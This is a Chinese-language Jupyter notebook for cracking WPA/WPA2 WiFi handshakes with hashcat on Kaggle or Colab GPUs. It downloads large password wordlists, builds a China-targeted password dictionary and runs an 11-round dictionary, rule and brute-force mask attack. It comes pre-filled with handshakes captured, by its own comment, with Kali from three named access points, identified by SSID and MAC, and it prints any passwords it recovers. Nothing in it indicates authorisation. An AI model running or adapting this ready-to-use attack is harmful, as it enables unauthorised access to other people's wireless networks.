# WiFi握手包GPU破解 v4.1 - Kaggle / Google Colab 双平台

**支持平台**: Kaggle Notebook (推荐) + Google Colab

**使用方法**:
1. 在 Kaggle/Colab 中开启 **GPU加速器**（Settings → Accelerator → GPU）
2. 直接 **Run All** 即可，hashline已预填充，无需额外操作
3. 如需替换目标，修改 Cell 7 的 `RAW_PASTE` 变量

**字典**: 中国字典优先(410万+100万+定制) + 全球字典(xato 1000万+Pwdb 100万+Probable 20万)
**注意**: Kaggle网络受限，wpa-sec等外部站点不可达，已自动跳过

**攻击策略**: 11轮递进（中国字典→全球字典→规则变换→数字掩码→手机号）

| GPU | WPA速度 | 8位数字 |
|-----|---------|--------|
| Kaggle P100 | ~120K H/s | ~14分钟 |
| Kaggle T4x2 | ~160K H/s | ~10分钟 |
| Colab T4 | ~80K H/s | ~20分钟 |

**目标AP (已预填充)**:
- 奶汉 (B0:95:8E:12:79:DA) [EAPoL]
- sxbctvnet-CE9730 (00:26:AC:CE:97:30) [EAPoL x7]
- TP-LINK_49AD (94:D9:B3:77:49:AD) [EAPoL]

## 1. 环境准备（自动检测 Colab / Kaggle）

In [ ]:
# ============================================================================
# 自动检测平台 + GPU检测
# 检测顺序: 先Kaggle（/kaggle目录） → 再Colab（google.colab模块）
# ============================================================================
import os, subprocess, sys

# ── 检测运行平台（Kaggle优先，避免误判）──
IS_KAGGLE = os.path.exists('/kaggle')
IS_COLAB = False
if not IS_KAGGLE:
    try:
        import google.colab
        IS_COLAB = True
    except ImportError:
        pass

PLATFORM = 'Kaggle' if IS_KAGGLE else ('Colab' if IS_COLAB else 'Unknown')
WORK_DIR = '/kaggle/working' if IS_KAGGLE else '/content'
os.makedirs(WORK_DIR, exist_ok=True)

print(f'平台: {PLATFORM}')
print(f'工作目录: {WORK_DIR}')
print()

# ── GPU检测 ──
!nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null || echo "[!] GPU不可用，请开启GPU加速器"
print()

In [ ]:
# ============================================================================
# hashcat安装
# Kaggle: 下载官方预编译二进制（无需编译，几秒完成）
# Colab: apt install hashcat（网络通畅）
# ============================================================================
import shutil, os, subprocess

HASHCAT_BIN = shutil.which('hashcat') or ''

if HASHCAT_BIN:
    print(f'hashcat已安装: {HASHCAT_BIN}')
    !{HASHCAT_BIN} --version
elif IS_KAGGLE:
    # Kaggle: 下载官方预编译二进制
    HC_VER = '6.2.6'
    HC_DIR = os.path.join(WORK_DIR, f'hashcat-{HC_VER}')
    HC_BIN = os.path.join(HC_DIR, 'hashcat.bin')
    if os.path.exists(HC_BIN):
        HASHCAT_BIN = HC_BIN
        print(f'使用已下载的hashcat {HC_VER}')
    else:
        print(f'Kaggle: 下载hashcat v{HC_VER} 预编译二进制...')
        os.chdir(WORK_DIR)
        !wget -q https://github.com/hashcat/hashcat/releases/download/v{HC_VER}/hashcat-{HC_VER}.7z
        !apt-get install -y -qq p7zip-full 2>&1 | tail -1
        !7z x -y hashcat-{HC_VER}.7z 2>&1 | tail -3
        !chmod +x {HC_BIN}
        !rm -f hashcat-{HC_VER}.7z
        if os.path.exists(HC_BIN):
            HASHCAT_BIN = HC_BIN
            print(f'[OK] hashcat {HC_VER} 安装完成')
        else:
            print('[!] 安装失败，请手动检查')
            HASHCAT_BIN = HC_BIN
    !{HASHCAT_BIN} --version 2>/dev/null || echo "hashcat未就绪"
else:
    # Colab: apt安装
    print('Colab: apt安装hashcat...')
    !apt-get update -qq && apt-get install -y -qq hashcat 2>&1 | tail -3
    HASHCAT_BIN = shutil.which('hashcat') or 'hashcat'
    !{HASHCAT_BIN} --version

# 检测GPU设备
print()
!{HASHCAT_BIN} -I 2>/dev/null | grep -E "Device|Name" | head -4 || echo "未检测到GPU设备"
print(f'\nhashcat: {HASHCAT_BIN}')

## 2. 下载字典 + 生成中国定制密码

In [ ]:
# ============================================================================
# 下载字典 + 生成中国定制密码（兼容Colab和Kaggle）
# Kaggle网络受限：仅使用GitHub源（raw.githubusercontent.com可达）
# wpa-sec等外部站点在Kaggle上不可达，已移除
# ============================================================================
import os, subprocess, glob, time, re

DICT_DIR = os.path.join(WORK_DIR, 'dicts')
os.makedirs(DICT_DIR, exist_ok=True)

def download_dict(url, save_path, desc, timeout_dl=60):
    """下载字典文件，支持 .gz 自动解压，失败直接跳过"""
    if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
        lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
        print(f'  [已存在] {desc}: {lines:,} 条')
        return True
    print(f'  [下载中] {desc}...')
    try:
        if url.endswith('.gz'):
            tmp = save_path + '.gz'
            r = subprocess.run(['wget','-q','--timeout=15','--tries=2',url,'-O',tmp], timeout=timeout_dl)
            if r.returncode != 0: raise Exception('wget失败')
            subprocess.run(['gunzip','-f',tmp], capture_output=True)
        else:
            r = subprocess.run(['wget','-q','--timeout=15','--tries=2',url,'-O',save_path], timeout=timeout_dl)
            if r.returncode != 0: raise Exception('wget失败')
        if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
            lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
            print(f'  [完成] {desc}: {lines:,} 条')
            return True
        else:
            print(f'  [跳过] {desc}: 文件为空')
    except Exception as e:
        print(f'  [跳过] {desc}: {e}')
        # 清理残留文件
        for p in [save_path, save_path + '.gz']:
            if os.path.exists(p) and os.path.getsize(p) < 100:
                os.remove(p)
    return False

# ============================================================
# 仅使用 GitHub raw 源（Kaggle可达）
# ============================================================
print('━━━━ 第一优先级: 中国专用字典 ━━━━')

# SecLists 中国密码 Top100万
DICT_CN_100W = os.path.join(DICT_DIR, 'chinese-top-1000000.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-1000000.txt',
    DICT_CN_100W, 'SecLists中国Top100万')

# SecLists 中国完整密码库（410万）
DICT_CN_FULL = os.path.join(DICT_DIR, 'chinese-full.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list.txt',
    DICT_CN_FULL, 'SecLists中国完整库(~410万)')

print()
print('━━━━ 第二优先级: 全球高频密码 ━━━━')

# Probable WPA 专用字典
DICT_PROBABLE = os.path.join(DICT_DIR, 'probable-wpa.txt')
download_dict(
    'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt',
    DICT_PROBABLE, 'Probable WPA专用(~20万)')

# SecLists 10K 高频
DICT_SECLISTS = os.path.join(DICT_DIR, 'seclists-10k.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt',
    DICT_SECLISTS, 'SecLists高频10K')

# xato 1000万密码
DICT_XATO = os.path.join(DICT_DIR, 'xato-10m.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt',
    DICT_XATO, 'xato全球1000万', timeout_dl=120)

# Pwdb Top 100万
DICT_PWDB = os.path.join(DICT_DIR, 'pwdb-top-1m.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/Pwdb_top-1000000.txt',
    DICT_PWDB, 'Pwdb全球Top100万')

# WiFi 常见默认密码
DICT_WIFI_DEFAULT = os.path.join(DICT_DIR, 'wifi-default.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt',
    DICT_WIFI_DEFAULT, 'WiFi默认密码(~4800)')

# wpa-sec（仅Colab可用，Kaggle跳过）
DICT_WPASEC = os.path.join(DICT_DIR, 'wpa-sec-cracked.txt')
if not IS_KAGGLE:
    download_dict('https://wpa-sec.stanev.org/dict/cracked.txt.gz', DICT_WPASEC, 'wpa-sec全球已破解(~75万)', timeout_dl=120)
else:
    if os.path.exists(DICT_WPASEC) and os.path.getsize(DICT_WPASEC) > 100:
        lines = int(subprocess.getoutput(f'wc -l < {DICT_WPASEC}').strip() or 0)
        print(f'  [已存在] wpa-sec: {lines:,} 条')
    else:
        print('  [跳过] wpa-sec: Kaggle网络不可达')

print()
print('━━━━ 第三优先级: 生成中国定制字典 ━━━━')

# ── 中国定制字典（针对WiFi密码习惯深度优化）──
DICT_CHINA = os.path.join(DICT_DIR, 'china-wifi-custom.txt')
def gen_china(path):
    """生成中国人WiFi密码习惯的定制字典"""
    seen = set(); count = [0]
    with open(path, 'w') as f:
        def a(s):
            if len(s) >= 8 and s not in seen:
                seen.add(s); f.write(s + '\n'); count[0] += 1

        # ── 重复数字 (最常见WiFi密码) ──
        for d in '0123456789':
            a(d * 8); a(d * 9); a(d * 10)

        # ── 递增递减序列 ──
        for s in range(10):
            a(''.join(str((s + i) % 10) for i in range(8)))
            a(''.join(str((s + i) % 10) for i in range(9)))
            a(''.join(str((s + i) % 10) for i in range(10)))
            a(''.join(str((s - i) % 10) for i in range(8)))

        # ── AABB模式 (11223344等) ──
        for x in range(10):
            for y in range(10):
                for z in range(10):
                    for w in range(10):
                        a(f'{x}{x}{y}{y}{z}{z}{w}{w}')

        # ── 4+4重复/镜像 (12341234, 12344321) ──
        for n in range(10000):
            s = f'{n:04d}'; a(s + s); a(s + s[::-1])

        # ── 生日 (19600101-20111231) ──
        for y in range(1960, 2012):
            for m in range(1, 13):
                for d in range(1, 32):
                    if m in (4, 6, 9, 11) and d > 30: continue
                    if m == 2 and d > 29: continue
                    a(f'{y:04d}{m:02d}{d:02d}')
                    a(f'{m:02d}{d:02d}{y:04d}')
                    ymd = f'{y:04d}{m:02d}{d:02d}'
                    for sx in ['a', 'A', '!', '@', '#']:
                        a(ymd + sx)

        # ── 520/1314 爱情密码 ──
        for i in range(100000):
            a(f'520{i:05d}'); a(f'{i:05d}520')
        for i in range(10000):
            a(f'1314{i:04d}'); a(f'{i:04d}1314')
        for i in range(100000):
            a(f'5201314{i:01d}' if i < 10 else f'5201314{i}')
        a('52013140'); a('52013141'); a('52013145'); a('52013146')
        for i in range(1000):
            a(f'5201314{i:03d}')

        # ── 拼音+数字 (中国最常见组合) ──
        py_list = [
            'woaini', 'nihao', 'mima', 'baobei', 'laogong', 'laopo',
            'wechat', 'weixin', 'taobao', 'jiayou', 'xingfu', 'kuaile',
            'xiaoming', 'zhangwei', 'wanglei', 'liuyang', 'chenwei',
            'zhangjie', 'wangfang', 'liming', 'zhanghao', 'wangwei',
            'zhangsan', 'lisi', 'wangwu', 'zhaoliu', 'sunqi',
            'aiwojia', 'haohao', 'shunli', 'pingan', 'facai',
            'gongxi', 'dianhua', 'shouji', 'diannao', 'youxiang',
            'qingchun', 'meili', 'yongyuan', 'zuichu', 'zuihao',
        ]
        num_suffix = [
            '123', '1234', '12345', '123456', '1234567', '12345678',
            '888', '666', '520', '1314', '0000', '9999',
            '111', '222', '333', '555', '777', '999',
            '88', '66', '99', '00', '168', '188', '518',
            '521', '886', '007', '2024', '2025', '2026',
        ]
        for py in py_list:
            for sx in num_suffix:
                a(py + sx); a(py.capitalize() + sx)
                a(sx + py)

        # ── 字母+数字 (a12345678, 1234567a 等) ──
        for c in 'abcdefghijklmnopqrstuvwxyz':
            for nm in ['1234567', '12345678', '123456789', '11111111',
                        '88888888', '00000000', '66666666', '99999999']:
                a(c + nm); a(nm + c)
        for c1 in 'abcdefghijklmnopqrstuvwxyz':
            for c2 in 'abcdefghijklmnopqrstuvwxyz':
                for nm in ['123456', '1234567', '888888', '666666', '520520']:
                    a(c1 + c2 + nm)

        # ── 4位块组合 ──
        p4 = ['0000', '1111', '2222', '3333', '4444', '5555',
              '6666', '7777', '8888', '9999', '1234', '5678',
              '1314', '0520', '1688', '6688', '8866']
        for p1 in p4:
            for p2 in p4:
                a(p1 + p2)
            for n in range(10000):
                a(p1 + f'{n:04d}')

        # ── 键盘模式 ──
        kb = ['qwertyui', 'qwerty123', 'asdfghjk', 'zxcvbnm1',
              'qazwsxed', 'q1w2e3r4', 'qwer1234', 'asdf1234',
              'zxcv1234', '1q2w3e4r', '1qaz2wsx', 'qweasdzxc',
              'password', 'iloveyou', 'trustno1', 'sunshine',
              'princess', 'football', 'baseball', 'dragon88',
              'master88', 'monkey88', 'shadow88', 'michael1']
        for k in kb:
            a(k)
            for sx in ['1', '12', '123', '!', '@', '#', '888', '666']:
                a(k + sx)

        # ── 手机号前缀+后缀 (常见WiFi密码) ──
        prefixes = ['130','131','132','133','134','135','136','137','138','139',
                    '150','151','152','153','155','156','157','158','159',
                    '170','171','172','173','175','176','177','178',
                    '180','181','182','183','184','185','186','187','188','189',
                    '191','193','195','196','197','198','199']
        for px in prefixes:
            for i in range(10000):
                a(f'{px}{i:04d}0000')
            for sx in ['00000000', '88888888', '66666666', '12345678']:
                a(px + sx[:8])

    return count[0]

if os.path.exists(DICT_CHINA) and os.path.getsize(DICT_CHINA) > 1000:
    lines = int(subprocess.getoutput(f'wc -l < {DICT_CHINA}').strip() or 0)
    print(f'  [已存在] 中国WiFi定制: {lines:,} 条')
else:
    print('  [生成中] 中国WiFi定制字典...')
    n = gen_china(DICT_CHINA)
    print(f'  [完成] 中国WiFi定制: {n:,} 条')

# ── 汇总所有字典 ──
print()
print('━━━━ 字典汇总 ━━━━')
all_dicts = []
total_lines = 0
for name, path in [
    ('中国Top100万',     DICT_CN_100W),
    ('中国完整库410万',  DICT_CN_FULL),
    ('中国WiFi定制',     DICT_CHINA),
    ('wpa-sec已破解',    DICT_WPASEC),
    ('Probable WPA',     DICT_PROBABLE),
    ('SecLists 10K',     DICT_SECLISTS),
    ('xato 1000万',      DICT_XATO),
    ('Pwdb Top100万',    DICT_PWDB),
    ('WiFi默认密码',     DICT_WIFI_DEFAULT),
]:
    if os.path.exists(path) and os.path.getsize(path) > 100:
        lines = int(subprocess.getoutput(f'wc -l < {path}').strip() or 0)
        sz = os.path.getsize(path) / (1024*1024)
        print(f'  {name:20s} {lines:>12,} 条  ({sz:.1f}MB)')
        all_dicts.append(path)
        total_lines += lines

print(f'  {"─"*50}')
print(f'  总计: {len(all_dicts)} 个字典, {total_lines:,} 条密码')

## 3. 粘贴握手包hashline（自动分割识别）

**直接在下方代码的 `RAW_PASTE` 变量中粘贴所有hashline**

支持的格式：
- 一次粘贴多条，每行一条
- 混合粘贴PMKID和EAPoL握手包
- 自动过滤空行、注释行、无效行
- 自动去重

**hashline格式示例**：
```
WPA*01*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码
WPA*02*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码*...
```

In [ ]:
# ============================================================================
# 握手包加载：预填充 Kali 抓取的 hashline + 自动扫描 .22000/.cap 文件
# ============================================================================
import os, subprocess, re, glob, shutil

# ╔══════════════════════════════════════════════════════════════════╗
# ║  方式1: 直接粘贴hashline（优先级最高）                          ║
# ║  方式2: 上传 .22000 / .hc22000 / .cap 文件到 Dataset           ║
# ║  两种方式可以同时使用，会自动合并去重                           ║
# ╚══════════════════════════════════════════════════════════════════╝
RAW_PASTE = """
WPA*02*cb9abf64ffa2674f9af45bb1af375193*b0958e1279da*d2aa6a302ce6*e5a5bde6b189*30311f0e50b3975217a0041dc247c55695b046b12456ae4afcbfae90f38f3d1c*0103007502010a0000000000000000000194db9a0a4d41f6c7ed36cebbfdcda3c48f3469fd79c404b25705af05a6b52313000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000*82
WPA*02*ae0df1bc9948ddceb732f83a0e88252e*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*699b9c62384ed3e543175f673aeed5ca4098a7781185066611cbc5b1b32c2511*01030077fe010a001000000000000000010b6874c66d91229d56f3e661cdfcb32f5dcde1e4cde8bd75233f4c94fa4cdc260000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018dd160050f20101000050f20201000050f20401000050f202*82
WPA*02*2a7f141da060564a0e68a108a6cc31b8*94d9b37749ad*1654070fa73c*54502d4c494e4b5f34394144*5ac1ce6d1192b6de020bc0bde45e12f9898d7a2658bdb8539d0e5f1d2af9e0a1*0103007502010a00000000000000000001662d3c802b5459fe3017e664d8c3d01bc505d10fdcc5b27db0fa8dd165b51616000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac028000*82
WPA*02*d98622ecd08f917c0d65073fda8ae1bb*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*c29b6191537a3f3576350e369d48cf44bd0b7ba2500581e9635a87856dfdc707*01030077fe010a00100000000000000001a78ce662b92cf4d9ab0e69604d59e8611503354c8c24ddb3edad6480da07a5d20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018dd160050f20101000050f20201000050f20401000050f202*82
WPA*02*bb9f664e76783f6db827b925979e2b06*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*a78ce662b92cf4d9ab0e69604d59e8611503354c8c24ddb3edad6480da07a5d2*0103007bfe01ca00100000000000000002c29b6191537a3f3576350e369d48cf44bd0b7ba2500581e9635a87856dfdc707000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001cdd1a0050f20101000050f20202000050f2020050f20401000050f202*13
WPA*02*ab9c6beb93aa88d444f185e9e6a901ff*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*2aa39ae040bd46dd9c334aed96e6bfc626c8f9c92bc872bd619bed136f9671d0*01030077fe010a00100000000000000003adbba5e896360944cfaeb60b710d10f28dc744ff66e97f1ae108624f36c06ce70000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018dd160050f20101000050f20201000050f20401000050f202*82
WPA*02*3d4026dbac0017b4ea24100ffa823879*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*adbba5e896360944cfaeb60b710d10f28dc744ff66e97f1ae108624f36c06ce7*0103007bfe01ca001000000000000000042aa39ae040bd46dd9c334aed96e6bfc626c8f9c92bc872bd619bed136f9671d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001cdd1a0050f20101000050f20202000050f2020050f20401000050f202*13
WPA*02*326c6d5cc2fff3d8370c0cb279ff1c78*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*13e9660a39b5b61d878b1e8168012a8495ecf52903163333d5a0430162fcd544*01030077fe010a00100000000000000001488af94e1551129fb212b3b435ceafd68aba3e31db2003d20cd960bdb10c1f940000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018dd160050f20101000050f20201000050f20401000050f202*82
WPA*02*cd7fd0743500386a6669b7a865edc09c*0026acce9730*a49b4ff37b78*7378626374766e65742d434539373330*488af94e1551129fb212b3b435ceafd68aba3e31db2003d20cd960bdb10c1f94*0103007bfe01ca0010000000000000000213e9660a39b5b61d878b1e8168012a8495ecf52903163333d5a0430162fcd544000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001cdd1a0050f20101000050f20202000050f2020050f20401000050f202*13
"""

def parse_hashlines(raw_text):
    """解析粘贴的hashline文本，支持多行、去重、过滤无效行"""
    seen = set(); valid = []; inv = 0; dup = 0
    for line in re.split(r'[\r\n]+', raw_text):
        line = line.strip()
        if not line or line.startswith('#') or line.startswith('//') or line.startswith('在这里'): continue
        for seg in re.split(r'[\t ]+', line):
            seg = seg.strip()
            if not seg.startswith('WPA*'): continue
            parts = seg.split('*')
            if len(parts) < 6 or parts[1] not in ('01','02'): inv+=1; continue
            if seg in seen: dup+=1; continue
            seen.add(seg); valid.append(seg)
    return valid, inv, dup

hashlines, n_inv, n_dup = parse_hashlines(RAW_PASTE)

# ── 自动扫描 Dataset 中的 .22000 / .hc22000 文件 ──
ds_lines = []
scan_dirs = ['/kaggle/input', '/kaggle/working'] if IS_KAGGLE else ['/content']
for sd in scan_dirs:
    if not os.path.isdir(sd): continue
    for ext in ['*.22000', '*.hc22000']:
        for fp in glob.glob(f'{sd}/**/{ext}', recursive=True):
            try:
                with open(fp) as f:
                    for l in f:
                        l = l.strip()
                        if l.startswith('WPA*') and l not in set(hashlines):
                            ds_lines.append(l)
            except: pass

# ── 自动扫描 .cap / .pcap 文件并用 hcxpcapngtool 转换 ──
cap_lines = []
for sd in scan_dirs:
    if not os.path.isdir(sd): continue
    for ext in ['*.cap', '*.pcap', '*.pcapng']:
        for fp in glob.glob(f'{sd}/**/{ext}', recursive=True):
            tmp_out = os.path.join(WORK_DIR, 'tmp_cap_convert.22000')
            r = subprocess.run(
                ['hcxpcapngtool', '--all', '-o', tmp_out, fp],
                capture_output=True, text=True, timeout=60
            ) if shutil.which('hcxpcapngtool') else None
            if r and os.path.exists(tmp_out):
                with open(tmp_out) as f:
                    for l in f:
                        l = l.strip()
                        if l.startswith('WPA*') and l not in set(hashlines) and l not in set(ds_lines):
                            cap_lines.append(l)
                os.remove(tmp_out)

# ── 合并所有hashline并去重 ──
all_set = set()
all_hashlines = []
for h in hashlines + ds_lines + cap_lines:
    if h not in all_set:
        all_set.add(h)
        all_hashlines.append(h)

# ── 写入合并文件 ──
ALL_HASHES = os.path.join(WORK_DIR, 'all_hashes.22000')
with open(ALL_HASHES, 'w') as out:
    for h in all_hashlines:
        out.write(h + '\n')

# ── 输出统计 ──
print(f'粘贴解析: {len(hashlines)} 条有效' + (f', {n_dup}重复' if n_dup else '') + (f', {n_inv}无效' if n_inv else ''))
if ds_lines: print(f'Dataset(.22000): {len(ds_lines)} 条')
if cap_lines: print(f'Cap文件转换: {len(cap_lines)} 条')
print(f'合计(去重后): {len(all_hashlines)} 个握手包')
print()

# ── 按目标AP分组展示 ──
targets = {}
for idx, h in enumerate(all_hashlines):
    p = h.split('*')
    if len(p) >= 6:
        t = 'PMKID' if p[1] == '01' else 'EAPoL'
        try: ssid = bytes.fromhex(p[5]).decode('utf-8', errors='replace')
        except: ssid = p[5][:24]
        mac = p[3]
        bssid = ':'.join(mac[j:j+2] for j in range(0, 12, 2)) if len(mac) >= 12 else mac
        key = f'{bssid}|{ssid}'
        if key not in targets:
            targets[key] = {'ssid': ssid, 'bssid': bssid, 'types': [], 'count': 0}
        targets[key]['types'].append(t)
        targets[key]['count'] += 1

print(f'目标AP: {len(targets)} 个')
print(f'{"─"*50}')
for i, (key, info) in enumerate(targets.items()):
    types_str = ', '.join(set(info['types']))
    print(f'  {i+1}. {info["ssid"]} ({info["bssid"]}) [{types_str}] x{info["count"]}条')

## 4. hashcat GPU批量破解（11轮递进攻击）

In [ ]:
# ============================================================================
# hashcat GPU批量破解：11轮递进攻击（中国字典优先）
# 攻击顺序: 中国字典 → 全球字典 → 规则变换 → 掩码暴力
# 使用实时输出模式，能看到 hashcat 的 Speed / Progress / ETA
# ============================================================================
import os, subprocess, time

OUTFILE = os.path.join(WORK_DIR, 'cracked_passwords.txt')
POTFILE = os.path.join(WORK_DIR, 'hashcat.potfile')
for f in [OUTFILE, POTFILE]:
    if os.path.exists(f): os.remove(f)

# ── 统计目标AP数量（按BSSID去重）──
target_aps = set()
for h in all_hashlines:
    p = h.split('*')
    if len(p) >= 4: target_aps.add(p[3])
TOTAL_APS = len(target_aps)

def dict_ok(path):
    """检查字典文件是否存在且有效"""
    return os.path.exists(path) and os.path.getsize(path) > 100

def show_cracked():
    """显示已破解的密码，按AP去重统计"""
    if not os.path.exists(POTFILE): return 0
    cracked_aps = {}
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                hp, pw = line.rsplit(':', 1)
                parts = hp.split('*')
                ssid = bssid = ''
                if len(parts) >= 6:
                    bssid = parts[3]
                    try: ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
                    except: ssid = parts[5][:20]
                if bssid and bssid not in cracked_aps:
                    cracked_aps[bssid] = (ssid, pw)
    if cracked_aps:
        print()
        print('  ╔════════════════════════════════════════╗')
        print('  ║         发现密码！                     ║')
        print('  ╠════════════════════════════════════════╣')
        for bssid, (ssid, pw) in cracked_aps.items():
            mac = ':'.join(bssid[j:j+2] for j in range(0, 12, 2)) if len(bssid)>=12 else bssid
            print(f'  ║  {ssid} ({mac}): {pw}')
        print('  ╚════════════════════════════════════════╝')
        print()
    return len(cracked_aps)

def run_hc(name, args, timeout_sec=7200):
    """运行hashcat攻击，实时显示进度（不再静默）"""
    print(f'\n{"─"*60}')
    print(f'  {name}')
    print(f'{"─"*60}')
    # --status: 定时输出进度  --status-timer 10: 每10秒刷新
    cmd = [HASHCAT_BIN, '-m', '22000', ALL_HASHES,
           '--potfile-path', POTFILE,
           '--outfile', OUTFILE, '--outfile-format', '2',
           '-w', '3', '-O',
           '--status', '--status-timer', '10'] + args
    t = time.time()
    try:
        # 不用 capture_output，让 hashcat 实时输出到屏幕
        subprocess.check_call(cmd, timeout=timeout_sec)
    except subprocess.CalledProcessError as e:
        # hashcat 返回码: 0=破解完成, 1=搜索完未破解, 其他=错误
        if e.returncode not in (0, 1):
            print(f'  [!] hashcat 返回错误码: {e.returncode}')
    except subprocess.TimeoutExpired:
        print(f'  [!] 超时({timeout_sec//60}分钟)')
        return False

    elapsed = time.time() - t
    print(f'  耗时: {elapsed:.1f}秒')

    n = show_cracked()
    bar_len = int(n / max(TOTAL_APS, 1) * 20)
    pct = n * 100 // max(TOTAL_APS, 1)
    print(f'  进度: [{n}/{TOTAL_APS}个AP] {"█" * bar_len}{"░" * (20 - bar_len)} {pct}%')
    if n >= TOTAL_APS:
        print(f'\n  ★★★ 全部 {TOTAL_APS} 个目标AP已破解！★★★')
        return True
    return False

def merge_dicts(dict_list, out_path):
    """合并多个字典文件，去重"""
    seen = set()
    with open(out_path, 'w') as f:
        for d in dict_list:
            if not dict_ok(d): continue
            for l in open(d, errors='ignore'):
                l = l.strip()
                if l and l not in seen:
                    seen.add(l); f.write(l + '\n')
    return len(seen)

# ============================================================
# 开始攻击（自动跳过不存在的字典）
# ============================================================
print(f'目标: {TOTAL_APS} 个AP（{len(all_hashlines)} 条hashline）')
print(f'hashcat: {HASHCAT_BIN}')
print(f'可用字典: {len(all_dicts)} 个')
t0 = time.time()
done = False
round_num = 0
total_rounds = 11

# ── 第1轮: 中国 Top100万 ──
round_num += 1
if not done and dict_ok(DICT_CN_100W):
    done = run_hc(f'{round_num}/{total_rounds}: 中国Top100万密码', ['-a', '0', DICT_CN_100W])

# ── 第2轮: 中国WiFi定制字典 ──
round_num += 1
if not done and dict_ok(DICT_CHINA):
    done = run_hc(f'{round_num}/{total_rounds}: 中国WiFi定制字典', ['-a', '0', DICT_CHINA])

# ── 第3轮: 中国完整密码库(410万) ──
round_num += 1
if not done and dict_ok(DICT_CN_FULL):
    done = run_hc(f'{round_num}/{total_rounds}: 中国完整密码库(~410万)', ['-a', '0', DICT_CN_FULL])

# ── 第4轮: wpa-sec全球已破解 ──
round_num += 1
if not done and dict_ok(DICT_WPASEC):
    done = run_hc(f'{round_num}/{total_rounds}: wpa-sec全球已破解(~75万)', ['-a', '0', DICT_WPASEC])
elif not dict_ok(DICT_WPASEC):
    print(f'\n  {round_num}/{total_rounds}: wpa-sec [跳过-未下载]')

# ── 第5轮: 全球字典合集 ──
round_num += 1
if not done:
    global_dicts = [d for d in [DICT_PROBABLE, DICT_SECLISTS, DICT_XATO, DICT_PWDB, DICT_WIFI_DEFAULT]
                    if dict_ok(d)]
    if global_dicts:
        mg = os.path.join(WORK_DIR, 'global_merged.txt')
        n = merge_dicts(global_dicts, mg)
        done = run_hc(f'{round_num}/{total_rounds}: 全球合并字典({n:,}条)', ['-a', '0', mg])

# ── 第6轮: 全字典 + best64规则 ──
round_num += 1
if not done:
    am = os.path.join(WORK_DIR, 'all_merged.txt')
    merge_dicts(all_dicts, am)
    rule = ''
    for rp in ['/usr/share/hashcat/rules/best64.rule',
               '/usr/local/share/hashcat/rules/best64.rule',
               os.path.join(WORK_DIR, 'hc', 'rules', 'best64.rule'),
               os.path.join(WORK_DIR, 'hashcat-6.2.6', 'rules', 'best64.rule')]:
        if os.path.exists(rp): rule = rp; break
    if rule:
        done = run_hc(f'{round_num}/{total_rounds}: 全字典+best64规则(x64倍)', ['-a', '0', am, '-r', rule], 3600)
    else:
        print(f'\n  {round_num}/{total_rounds}: best64规则 [跳过-未找到规则文件]')

# ── 第7轮: 8位纯数字 ──
round_num += 1
if not done:
    done = run_hc(f'{round_num}/{total_rounds}: 8位纯数字(1亿)', ['-a', '3', '?d?d?d?d?d?d?d?d'])

# ── 第8轮: 字母+7位数字 ──
round_num += 1
if not done:
    mf = os.path.join(WORK_DIR, 'prefix_masks.hcmask')
    with open(mf, 'w') as f:
        for c in 'abcdefghijklmnopqrstuvwxyz':
            f.write(f'{c}?d?d?d?d?d?d?d\n')
    done = run_hc(f'{round_num}/{total_rounds}: 字母+7位数字(a~z+7位)', ['-a', '3', mf], 3600)

# ── 第9轮: 9位纯数字 ──
round_num += 1
if not done:
    done = run_hc(f'{round_num}/{total_rounds}: 9位纯数字(10亿)', ['-a', '3', '?d?d?d?d?d?d?d?d?d'], 14400)

# ── 第10轮: 手机号 ──
round_num += 1
if not done:
    done = run_hc(f'{round_num}/{total_rounds}: 手机号(1+10位)', ['-a', '3', '1?d?d?d?d?d?d?d?d?d?d'], 14400)

# ── 第11轮: 10位纯数字 ──
round_num += 1
if not done:
    done = run_hc(f'{round_num}/{total_rounds}: 10位纯数字(100亿)', ['-a', '3', '?d?d?d?d?d?d?d?d?d?d'], 21600)

# ── 最终汇总 ──
print(f'\n{"═"*60}')
print(f'  全部{total_rounds}轮完成 | 总耗时: {(time.time()-t0)/60:.1f}分钟')
n = show_cracked()
if n == 0:
    print('  未破解。建议:')
    print('  1. 检查握手包完整性（是否包含有效EAPOL M1+M2）')
    print('  2. 尝试更大字典或自定义规则')
